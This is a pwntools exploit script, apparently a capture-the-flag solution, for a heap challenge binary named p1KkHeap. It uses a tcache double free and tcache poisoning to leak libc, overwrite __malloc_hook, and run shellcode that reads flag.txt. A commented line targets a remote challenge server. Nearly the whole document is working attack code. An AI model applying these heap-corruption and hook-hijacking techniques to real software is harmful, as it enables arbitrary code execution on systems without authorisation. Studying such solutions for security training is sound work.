from pwn import *
context.log_level = 'debug'
prog = './p1KkHeap'
elf = ELF(prog)
libc = ELF("./libc.so.6")
#p = process(prog)
context.arch = 'amd64'
def dbg():
    gdb.attach(p)
    p.interactive()

def add(size):
	p.sendlineafter("Choice: ", '1')
	p.sendlineafter("size: ", str(size))
def show(idx):
	p.sendlineafter("Choice: ", '2')
	p.sendlineafter("id: ", str(idx))
def edit(idx, content):
	p.sendlineafter("Choice: ", '3')
	p.sendlineafter("id", str(idx))
	p.sendafter("content: ", content)
def free(idx):
	p.sendlineafter("Choice: ", '4')
	p.sendlineafter("id: ", str(idx))
def exp():
	global p
	p = process(prog)
	#p = remote("39.98.64.24", 9091)
	add(0x80)#0
	add(0x100)#1
	free(1)
	free(1)
	add(0x100)#2
	edit(2, p16(0x7000))
	add(0x100)#3
	try:
		add(0x100)#4
		edit(4, '\xff'*0x40)
	except:
		p.close()
		return False
	dbg()
	free(0)
	show(0)
	data = p.recvline_startswith("content")
	libc_base = u64(data[-6:]+'\x00'*2)-4111520
	if libc_base &0xff!=0:
		p.close()
		return False
	log.info("libc_base: "+hex(libc_base))
	malloc_hook = libc_base + libc.sym['__malloc_hook']
	edit(4, '\x01'*0x40+p64(0)*16+p64(malloc_hook)+p64(0x66660300))
	add(0x100)#5
	shellcode  = shellcraft.amd64.open("./flag.txt")
	shellcode += shellcraft.amd64.read(3,0x66660800,0x30)
	shellcode += shellcraft.amd64.write(1,0x66660800,0x30)
	edit(5, asm(shellcode))
	add(0xf0)#6
	edit(6, p64(0x66660300))
	p.sendlineafter("Choice: ", '1')
	p.sendlineafter("size: ", '10')
	p.interactive()
if __name__ == '__main__':
	while not exp():
		exp()